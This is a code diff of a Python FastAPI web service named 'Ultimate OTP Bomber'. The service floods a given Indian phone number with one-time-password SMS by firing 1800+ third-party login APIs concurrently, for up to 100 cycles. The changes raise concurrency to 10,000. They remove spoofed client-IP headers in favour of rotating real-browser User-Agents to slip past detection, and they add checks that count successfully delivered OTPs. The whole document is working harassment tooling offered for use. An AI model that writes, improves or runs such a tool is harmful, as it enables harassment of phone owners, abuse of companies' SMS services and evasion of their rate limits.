@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 """
-🔥 ULTIMATE OTP BOMBER - FINAL COMPLETE VERSION 🔥
-Combines: apis.py + apis1.py + apis2.py + apis3.py + apis4.py
-Total APIs: 3000+ | Super Fast | Async
+🔥 ULTIMATE OTP BOMBER - FINAL v6.0 🔥
+❌ NO LIMITS - ALL 1800+ APIs FIRE
+✅ Fake IP headers REMOVED
+✅ Better response validation
+✅ Super fast async
 """
 import asyncio
 import time
@@ -56,7 +58,7 @@ except Exception as e:
     APIS_5 = []
 
 # ==============================================================================
-# 🔥 COMBINE ALL APIs
+# 🔥 COMBINE ALL APIs (NO FILTER - SAB FIRE HONGE)
 # ==============================================================================
 
 ULTIMATE_APIS = APIS_1 + APIS_2 + APIS_3 + APIS_4 + APIS_5
@@ -81,7 +83,7 @@ except ImportError:
 # 🚀 FASTAPI APP
 # ==============================================================================
 
-app = FastAPI(title="Ultimate OTP Bomber", version="4.0")
+app = FastAPI(title="Ultimate OTP Bomber", version="6.0")
 
 app.add_middleware(
     CORSMiddleware,
@@ -91,24 +93,26 @@ app.add_middleware(
 )
 
 # ==============================================================================
-# ⚙️ CONFIGURATION
+# ⚙️ CONFIGURATION - NO LIMITS!
 # ==============================================================================
 
-MAX_CONCURRENT = 5000
-BATCH_CHUNK = 500
-REQUEST_TIMEOUT = 8
-CONNECT_TIMEOUT = 4
-OTP_KEYWORDS = ("success", "sent", "otp", "verified", "delivered", "true", "ok", "message")
+MAX_CONCURRENT = 10000         # 🔥 Unlimited concurrent
+BATCH_CHUNK = 1000             # 🔥 Big batches
+REQUEST_TIMEOUT = 10
+CONNECT_TIMEOUT = 5
 
-FAKE_IPS = [
-    "103.159.84.134", "49.36.180.11", "157.32.75.10",
-    "182.70.117.55", "106.51.85.20", "47.11.248.163",
-    "13.234.100.50", "52.66.200.100", "13.126.50.75",
-    "104.211.50.25", "20.198.100.75", "13.232.150.25"
+# Real browser User-Agents
+REAL_USER_AGENTS = [
+    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
 ]
 
 # ==============================================================================
-# 📊 STATE MANAGEMENT
+# 📊 STATE
 # ==============================================================================
 
 _jobs = {}
@@ -121,18 +125,23 @@ _stats = defaultdict(lambda: {
 # 🔥 CORE FIRING FUNCTION
 # ==============================================================================
 
-async def fire_one(session, api, phone, stats, ip):
+async def fire_one(session, api, phone, stats, counter):
+    """Fire a single API"""
     try:
+        # Build URL
         if callable(api.get("url")):
             url = api["url"](phone)
         else:
             url = api["url"]
 
+        # Build headers
         headers = dict(api.get("headers", {}))
-        headers["X-Forwarded-For"] = ip
-        headers["Client-IP"] = ip
-        headers["X-Real-IP"] = ip
 
+        # Add User-Agent if missing
+        if not any(k.lower() == "user-agent" for k in headers.keys()):
+            headers["User-Agent"] = random.choice(REAL_USER_AGENTS)
+
+        # Build payload
         data = None
         if api.get("data"):
             if callable(api["data"]):
@@ -142,6 +151,7 @@ async def fire_one(session, api, phone, stats, ip):
 
         method = api.get("method", "POST").upper()
 
+        # Fire request
         if method == "POST":
             async with session.post(url, headers=headers, data=data, ssl=False) as r:
                 status = r.status
@@ -158,18 +168,30 @@ async def fire_one(session, api, phone, stats, ip):
                     txt = ""
 
         stats["total"] += 1
+        body_lower = txt[:1000].lower()
 
-        if status < 400:
+        # Validate response
+        error_keywords = ["error", "invalid", "failed", "unauthorized", "blocked", "denied", "captcha"]
+        success_keywords = ["success", "sent", "otp has been", "otp sent", "otp deliver", "verification code"]
+
+        is_error = any(k in body_lower for k in error_keywords)
+        is_success = any(k in body_lower for k in success_keywords)
+
+        if status < 400 and not is_error:
             stats["ok"] += 1
-            if any(k in txt[:500].lower() for k in OTP_KEYWORDS):
+            if is_success:
                 stats["otp"] += 1
                 print(f"  ✅ [{api['name']}] OTP SENT ({status})")
             else:
                 print(f"  🟡 [{api['name']}] HTTP {status}")
         else:
             stats["fail"] += 1
+            print(f"  ❌ [{api['name']}] HTTP {status}")
 
     except asyncio.TimeoutError:
+        stats["total"] += 1
+        stats["fail"] += 1
+    except aiohttp.ClientError:
         stats["total"] += 1
         stats["fail"] += 1
     except Exception:
@@ -183,12 +205,15 @@ async def fire_one(session, api, phone, stats, ip):
 async def worker(job_id, phone, count):
     _stop_flags.discard(phone)
 
+    # 🔥 NO LIMITS Connector
     connector = aiohttp.TCPConnector(
         limit=MAX_CONCURRENT,
-        limit_per_host=50,
+        limit_per_host=100,       # 🔥 100 per host
         ssl=False,
         force_close=False,
-        enable_cleanup_closed=True
+        enable_cleanup_closed=True,
+        ttl_dns_cache=300,
+        use_dns_cache=True
     )
 
     timeout = aiohttp.ClientTimeout(
@@ -205,30 +230,36 @@ async def worker(job_id, phone, count):
     stats["start"] = time.time()
 
     print(f"\n{'='*70}")
-    print(f"🔥 [{job_id}] FIRING {TOTAL_APIS} APIs → +91{phone}")
+    print(f"🔥 [{job_id}] FIRING ALL {TOTAL_APIS} APIs → +91{phone}")
     print(f"🔁 Cycles: {count}")
     print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
+    print(f"📦 Batch Size: {BATCH_CHUNK}")
     print(f"{'='*70}\n")
 
     try:
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
             for cycle in range(count):
                 if phone in _stop_flags:
-                    print(f"🛑 [{job_id}] STOPPED by user")
+                    print(f"🛑 [{job_id}] STOPPED")
                     break
 
-                print(f"\n🚀 CYCLE {cycle+1}/{count} STARTED\n")
+                print(f"\n🚀 CYCLE {cycle+1}/{count} STARTED")
+                print(f"📤 Firing {TOTAL_APIS} APIs...\n")
 
-                tasks = []
-                for api in ULTIMATE_APIS:
-                    ip = random.choice(FAKE_IPS)
-                    tasks.append(fire_one(session, api, phone, stats, ip))
+                # 🔥 FIRE ALL APIs (no limit)
+                counter = {"n": 0}
+                tasks = [fire_one(session, api, phone, stats, counter) for api in ULTIMATE_APIS]
 
+                # Process in batches for memory efficiency
                 for i in range(0, len(tasks), BATCH_CHUNK):
                     if phone in _stop_flags:
                         break
                     batch = tasks[i:i + BATCH_CHUNK]
                     await asyncio.gather(*batch, return_exceptions=True)
+                    
+                    # Progress
+                    done = min(i + BATCH_CHUNK, len(tasks))
+                    print(f"  📊 Progress: {done}/{len(tasks)} ({done*100//len(tasks)}%)")
 
                 elapsed = time.time() - stats["start"]
                 rps = stats["total"] / elapsed if elapsed else 0
@@ -239,7 +270,7 @@ async def worker(job_id, phone, count):
                 print(f"⚡ Speed: {rps:.1f} req/sec")
                 print(f"{'─'*70}\n")
 
-                await asyncio.sleep(0.1)
+                await asyncio.sleep(0.5)
 
     except Exception as e:
         print(f"❌ Worker error: {e}")
@@ -249,18 +280,19 @@ async def worker(job_id, phone, count):
         print(f"\n{'='*70}")
         print(f"🏁 JOB COMPLETE: {job_id}")
         print(f"📱 Target: +91{phone}")
-        print(f"📊 Total: {stats['total']} | OK: {stats['ok']} | OTP: {stats['otp']} | Fail: {stats['fail']}")
+        print(f"📊 Total Fired: {stats['total']}")
+        print(f"✅ OK: {stats['ok']} | 🎯 OTP: {stats['otp']} | ❌ Fail: {stats['fail']}")
         print(f"⏱️  Time: {total_time:.2f}s | Speed: {stats['total']/total_time:.1f} req/s")
         print(f"{'='*70}\n")
 
 # ==============================================================================
-# 🌐 API ENDPOINTS
+# 🌐 ENDPOINTS
 # ==============================================================================
 
 @app.get("/")
 async def root():
     return {
-        "status": "🔥 ULTIMATE OTP BOMBER RUNNING",
+        "status": "🔥 ULTIMATE OTP BOMBER v6.0 RUNNING",
         "total_apis": TOTAL_APIS,
         "apis_breakdown": {
             "apis.py": len(APIS_1),
@@ -269,12 +301,16 @@ async def root():
             "apis3.py": len(APIS_4),
             "apis4.py": len(APIS_5)
         },
+        "config": {
+            "max_concurrent": MAX_CONCURRENT,
+            "batch_chunk": BATCH_CHUNK,
+            "timeout": REQUEST_TIMEOUT
+        },
         "endpoints": {
             "fire": "/send?number=9876543210&count=1",
             "stop": "/stop?number=9876543210",
             "stats": "/stats?number=9876543210",
-            "list_apis": "/apis",
-            "jobs": "/jobs"
+            "apis": "/apis"
         }
     }
 
@@ -282,18 +318,16 @@ async def root():
 async def list_apis():
     return {
         "total": TOTAL_APIS,
-        "apis": [
-            {"name": a["name"], "url": a["url"] if not callable(a["url"]) else "dynamic"}
-            for a in ULTIMATE_APIS
-        ]
+        "apis": [a["name"] for a in ULTIMATE_APIS]
     }
 
 @app.get("/send")
 async def send(
     bg: BackgroundTasks,
     number: str = Query(..., description="10 digit mobile number"),
-    count: int = Query(1, ge=1, le=100, description="Number of cycles")
+    count: int = Query(1, ge=1, le=100, description="Number of cycles (max 100)")
 ):
+    """🔥 FIRE ALL APIs"""
     number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
 
     if not number.isdigit() or len(number) != 10:
@@ -318,14 +352,13 @@ async def send(
         "total_apis": TOTAL_APIS,
         "cycles": count,
         "total_requests": count * TOTAL_APIS,
-        "message": f"🔥 FIRING {TOTAL_APIS} APIs x {count} cycles = {count * TOTAL_APIS} requests"
+        "message": f"🔥 FIRING ALL {TOTAL_APIS} APIs × {count} cycles = {count * TOTAL_APIS} REQUESTS"
     }
 
 @app.get("/stop")
 async def stop(number: str = Query(...)):
     number = number.strip().replace("+", "").replace(" ", "")
     _stop_flags.add(number)
-
     return {
         "success": True,
         "message": f"🛑 Stopping attacks on {number}",
@@ -338,7 +371,7 @@ async def stats(number: str = Query(...)):
     s = _stats.get(number)
 
     if not s or not s.get("start"):
-        return {"error": "No stats found for this number"}
+        return {"error": "No stats found"}
 
     elapsed = time.time() - s["start"]
     return {
@@ -360,25 +393,19 @@ async def jobs():
     }
 
 # ==============================================================================
-# 🚀 MAIN ENTRY POINT
+# 🚀 MAIN
 # ==============================================================================
 
 if __name__ == "__main__":
     print(f"""
 ╔══════════════════════════════════════════════════════════════╗
 ║                                                              ║
-║   🔥  ULTIMATE OTP BOMBER v4.0  🔥                          ║
+║   🔥  ULTIMATE OTP BOMBER v6.0  🔥                          ║
 ║                                                              ║
-║   📊 Total APIs Loaded: {TOTAL_APIS:<35}║
-║   ⚡ Max Concurrent: {MAX_CONCURRENT:<39}║
-║   🚀 Server: http://0.0.0.0:5000                            ║
-║                                                              ║
-║   📦 API Files Loaded:                                       ║
-║   ▸ apis.py   : {len(APIS_1):<44}║
-║   ▸ apis1.py  : {len(APIS_2):<44}║
-║   ▸ apis2.py  : {len(APIS_3):<44}║
-║   ▸ apis3.py  : {len(APIS_4):<44}║
-║   ▸ apis4.py  : {len(APIS_5):<44}║
+║   📊 TOTAL APIs:    {TOTAL_APIS:<39}║
+║   ⚡ MAX CONCURRENT: {MAX_CONCURRENT:<38}║
+║   📦 BATCH SIZE:    {BATCH_CHUNK:<39}║
+║   🚀 SERVER: http://0.0.0.0:5000                            ║
 ║                                                              ║
 ║   📱 Endpoints:                                              ║
 ║   ▸ /send?number=9876543210&count=1                         ║
